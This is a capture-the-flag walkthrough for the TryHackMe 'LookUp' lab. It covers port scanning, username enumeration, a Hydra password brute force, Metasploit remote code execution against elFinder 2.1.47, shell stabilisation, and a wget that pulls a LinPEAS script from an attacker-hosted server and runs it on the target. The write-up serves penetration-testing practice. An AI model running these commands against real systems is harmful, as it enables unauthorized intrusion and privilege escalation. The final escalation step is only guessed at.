# CTF Walkthrough: LookUp Ctf TryHackMe

## 1. Initial Recon

Run a full port scan and service detection using Nmap:
```bash
nmap -sC -sV -p- <target_ip>
# Or for aggressive scan:
nmap -A <target_ip>
```

## 2. Web App Enumeration
- Attempted various login credentials and inspected responses with Burp Suite.
- Discovered that `admin` is a valid username (potential for password enumeration).

## 3. Username Enumeration
- Wrote a Python script to enumerate usernames.
- Found another valid user: `jose`.

## 4. Password Bruteforce
Used Hydra to bruteforce Jose's password:
```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```
- Successfully discovered password: `password123`

## 5. Gaining Access
- Logged in with `jose:password123`
- Discovered a file manager interface: **elFinder**
- Checked for any credentials in stored files

## 6. Application Enumeration
- Located the version of elFinder: `2.1.47`

## 7. Vulnerability Research
- Searched online and found **CVE-2019-9194**, an RCE vulnerability in elFinder 2.1.47

## 8. Exploiting elFinder (RCE via Metasploit)
Start Metasploit:
```bash
msfconsole
```
Search and load the exploit:
```bash
search elfinder
use exploit/multi/http/elfinder_upload_exec
```
Set options:
```bash
set RHOSTS files.lookup.thm
set LHOST <your_IP>
run
```

## 9. Post-Exploitation: Gaining a TTY
On meterpreter, spawn a full shell:
```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 10. Privilege Escalation
- Discovered user `think` and found `user.txt` (flag file) but lacked permission to read it.

## 11. Enumeration for Privilege Escalation
Find writable directories:
```bash
find / -type d -writable 2>/dev/null
```
Find SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Check for sudo permissions:
```bash
sudo -l
```

## 12. Automated Enumeration with LinPEAS
On attacker machine:
```bash
python3 -m http.server 9000
```
On target machine:
```bash
wget http://<attacker_ip>:9000/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## 13. Finding Custom SUID Binary
- Discovered unusual SUID binary: `/usr/sbin/pwm`
- Suspected to be custom and potentially exploitable.

## 🔚 Conclusion
Successfully exploited a vulnerable version of elFinder for initial access and began privilege escalation using enumeration and custom binary analysis. Final escalation likely involved hijacking environment variables (e.g., `$PATH`) or crafting malicious scripts for SUID execution.

📝 *Note: Always document findings and steps clearly. This is a vital skill in both CTF and real-world penetration testing.*
